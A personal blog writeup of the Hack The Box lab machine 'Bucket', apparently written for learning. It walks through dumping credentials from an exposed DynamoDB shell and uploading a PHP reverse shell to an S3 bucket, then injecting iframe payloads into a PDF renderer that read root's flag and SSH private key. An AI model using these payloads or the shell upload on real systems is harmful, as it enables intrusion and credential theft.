---
title: Hackthebox Bucket Writeup
image: /images/bucket/info.jpeg
tags: 
- hackthebox
- writeup
---

After finally recovering from hackthebox burnout, finally I did another box. Unlike previous times, this time I decided to take my time rooting and I enjoyed the process a lot more. So this one was all about AWS. Mainly s3 bucket and dynamodb. A lot of documentation read-up was required to root this one. Let's dive in.

<!--more-->

<img src="/images/bucket/info.jpeg">

Kicking off with basic nmap scan

```

nmap -T4 10.10.10.212
PORT   STATE SERVICE 
22/tcp open  ssh     
80/tcp open  http    
```

So not much. Just SSH and a web server. Lets browse to the server. We need to add an entry in the hosts file.

`10.10.10.212    bucket.htb`

Now we can open the web page.Nothing unusual. Lets see the HTML.

<img src="/images/bucket/html.png">

Oohhh... what is this? That looks like a s3 bucket. Lets browse to it. but first add an entry to the hosts file for it.

`10.10.10.212    bucket.htb s3.bucket.htb`

It just shows `{"status":"running"}`

Time to go and bust some directories. (get it? Go-Buster?)

```
gobuster dir -w /tools/common.txt -u http://s3.bucket.htb -x "txt"
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://s3.bucket.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /tools/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              txt
[+] Timeout:                 10s
===============================================================
2021/02/24 04:25:02 Starting gobuster in directory enumeration mode
===============================================================
/health               (Status: 200) [Size: 54]
/server-status        (Status: 403) [Size: 278]
/shell                (Status: 200) [Size: 0]  
/shell.txt            (Status: 500) [Size: 158]

```

`/shell` looks pretty juicy if you ask me. Browse to it and... Never in my life have I thought that a measly "/" would give me so much trouble. I had to browse to `/shell/` to finally land on something.

<img src="/images/bucket/dynamo.png" width="500">

That looks pretty intimidating. After reading some docs and some stackoverflow later i find that dynamodb is just another nosql type of database. it can store data in form of key:value pairs. Next was how to query it. The dynamodb shell had some pre written code to query stuff. I selected the "list tables" option and gave it a limit of 10(The number of results to display).

```
var params = {
    ExclusiveStartTableName: 'table_name', // optional (for pagination, returned as LastEvaluatedTableName)
    Limit: 10, // optional (to further limit the number of table names returned per page)
};
dynamodb.listTables(params, function(err, data) {
    if (err) ppJson(err); // an error occurred
    else ppJson(data); // successful response
});
```

<img src="/images/bucket/tables.png" width="500">

Next I wanted the content of that table. Again I used the pre written code and changed it a bit. Here is what I did to get the content of the table "users".

```
var params = {
    TableName: 'users',
    Limit: 50, // optional (limit the number of items to evaluate)
    ReturnConsumedCapacity: 'NONE', // optional (NONE | TOTAL | INDEXES)
};
dynamodb.scan(params, function(err, data) {
    if (err) ppJson(err); // an error occurred
    else ppJson(data); // successful response
});
```

Here is what I got:

<img src="/images/bucket/creds.png">

All of the above process would have been even more easier if I used the aws cli to begin with. oh well...

I tried all these creds on SSH to no luck. Next I remember that this also has a s3 bucket. Lets enumerate that. I installed awscli and thought "Damn! do i need to set it up with my real access ID and secret?". Nope. Someone suggested I don't need to. So I just gave all the fields in the configuration part some random input and it worked fine.

Right.. now we begin s3 enumeration. 

```
aws --endpoint-url http://s3.bucket.htb s3 ls
2021-04-10 05:24:03 adserver

aws --endpoint-url http://s3.bucket.htb s3 ls s3://adserver
                           PRE images/
2021-04-10 05:24:04       5344 index.html
```

Alright we see the content that was being displayed earlier on the main website. Only thing that comes to mind now is to upload a webshell and browse to it. 

```
$ aws --endpoint-url http://s3.bucket.htb s3 cp php-reverse-shell.php s3://adserver
upload: ./php-reverse-shell.php to s3://adserver/php-reverse-shell.php

aws --endpoint-url http://s3.bucket.htb s3 ls s3://adserver
                           PRE images/
2021-04-10 05:28:04       5344 index.html
2021-04-10 05:28:33       5494 php-reverse-shell.php
```

Now browse to `http://bucket.htb/php-reverse-shell.php` and we get a shell back!

```
$ nc -lvp 1234
Listening on 0.0.0.0 1234
Connection received on bucket.htb 51114
Linux bucket 5.4.0-48-generic #52-Ubuntu SMP Thu Sep 10 10:58:49 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 05:29:30 up  6:27,  0 users,  load average: 0.02, 0.06, 0.07
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
```

Looking around I found a user "Roy" and tried to ssh with the name "ROY" and the password "n2vM-<_K_Q:.Aa2" (From earlier) and we get the user flag.

Started looking around and found some interesting open ports.

```
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:33073         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:4566          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
```

Port 8000 was not available when I scanned from outside. Neither was 4566. I curled the port 8000 and 4566 and got some content back. I decided to find their source code. I went ahead and found the apache config file.

```
<VirtualHost 127.0.0.1:8000>
	<IfModule mpm_itk_module>
		AssignUserId root root
	</IfModule>
	DocumentRoot /var/www/bucket-app
</VirtualHost>

ProxyPass / http://localhost:4566/
	ProxyPassReverse / http://localhost:4566/
	<Proxy *>
		 Order deny,allow
		 Allow from all
	 </Proxy>
	ServerAdmin webmaster@localhost
	ServerName s3.bucket.htb
```

So the code for port 8000 is in "bucket-app" folder and port 4566 is the S3 bucket server. Nice. Lets try "bucket-app" first. I found some interesting content in the "index.php" file for port 8000.

```
<?php
require 'vendor/autoload.php';
use Aws\DynamoDb\DynamoDbClient;
if($_SERVER["REQUEST_METHOD"]==="POST") {
	if($_POST["action"]==="get_alerts") {
		date_default_timezone_set('America/New_York');
		$client = new DynamoDbClient([
			'profile' => 'default',
			'region'  => 'us-east-1',
			'version' => 'latest',
			'endpoint' => 'http://localhost:4566'
		]);

		$iterator = $client->getIterator('Scan', array(
			'TableName' => 'alerts',
			'FilterExpression' => "title = :title",
			'ExpressionAttributeValues' => array(":title"=>array("S"=>"Ransomware")),
		));

		foreach ($iterator as $item) {
			$name=rand(1,10000).'.html';
			file_put_contents('files/'.$name,$item["data"]);
		}
		passthru("java -Xmx512m -Djava.awt.headless=true -cp pd4ml_demo.jar Pd4Cmd file:///var/www/bucket-app/files/$name 800 A4 -out files/result.pdf");
	}
}
else
{
?>
```

Took some time to figure out what it was doing. So. When we send a post request to the server at port 8000 with the data "action=get_alerts" it goes out to the dynamodb at port 4566 and looks for a table named "alerts". From that table it then filters for the content. It fetches the data for key named title. So when the key named "title" is equal to "Ransomware" It fetches another key "data" and then supplies it to the "PD4ml" binary. "Pd4ml" is a utility to convert html pages to pdf. and finally that pdf is saved to the folder named "files". 

As soon as I understood what it was doing the exploitation part was clear:

Create table named "alerts" and insert the content into it as it is expecting. Supply malicious html inside the "data" key which will be then rendered by the "pd4ml" binary. When the binary executes, it saves the result to a pdf. 

To create malicious HTML I first tried giving something like `<img src="http://my IP:port/">` and saw a request on a simple python server running on my box. This proves that I was right and then created an actual payload to read data from root user using iframes.

[Here is the docs I used](https://docs.aws.amazon.com/amazondynamodb/latest/developerguide/getting-started-step-1.html)

This was my payload:

`<html><body><iframe src='file:///root/root.txt'></iframe></body></html>`

I know just reading the flag is not at all interesting. Do not fret for I shall root this box in the end. Only problem was this box cleared everything faster than the speed of light. So I created a script.

```
aws --endpoint-url http://localhost:4566 dynamodb create-table --table-name alerts --attribute-definitions AttributeName=title,AttributeType=S AttributeName=data,AttributeType=S --key-schema AttributeName=title,KeyType=HASH AttributeName=data,KeyType=RANGE --provisioned-throughput ReadCapacityUnits=100,WriteCapacityUnits=100
aws --endpoint-url http://localhost:4566 dynamodb list-tables
aws --endpoint-url http://localhost:4566 dynamodb put-item --table-name alerts --item '{"title":{"S":"Ransomware"},"data":{"S":"<html><body><iframe src='file:///root/root.txt'></iframe></body></html>"}}'
aws --endpoint-url http://localhost:4566 dynamodb scan --table-name alerts
curl -X POST -d"action=get_alerts"  http://localhost:8000
ls /var/www/bucket-app/files
python3 -m http.server 1234
```

Till curl the script does exactly what I just said. After that it just makes a post request to the server, lists out the files in the "files" directory and then finally sets up a python server for me to download those pdfs.

Disclaimer: Do not think that all of this was as easy as I just wrote. This took me a few days. Just because I write about success does not mean I did not face failure.

After I download the pdf I can see the sweet and juicy content.

<img src="/images/bucket/flag.png" width="500">

Now that I have submitted the flag. Lets just destroy this one completely. 

`<html><body><iframe src='file:///root/.ssh/id_rsa'></iframe></body></html>`

<img src="/images/bucket/ssh.png" width="500">

```
ssh -i id_rsa root@bucket.htb
Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-48-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon 05 Apr 2021 06:09:32 AM UTC

  System load:                      0.01
  Usage of /:                       33.5% of 17.59GB
  Memory usage:                     19%
  Swap usage:                       0%
  Processes:                        240
  Users logged in:                  1
  IPv4 address for br-bee97070fb20: 172.18.0.1
  IPv4 address for docker0:         172.17.0.1
  IPv4 address for ens160:          10.10.10.212
  IPv6 address for ens160:          dead:beef::250:56ff:feb9:7a8

 * Kubernetes 1.19 is out! Get it in one command with:

     sudo snap install microk8s --channel=1.19 --classic

   https://microk8s.io/ has docs and details.

229 updates can be installed immediately.
103 of these updates are security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Tue Feb  9 14:39:03 2021
root@bucket:~# whoami
root
root@bucket:~# hostname
bucket
```

I felt pretty proud when I did this box. HTB was fun again!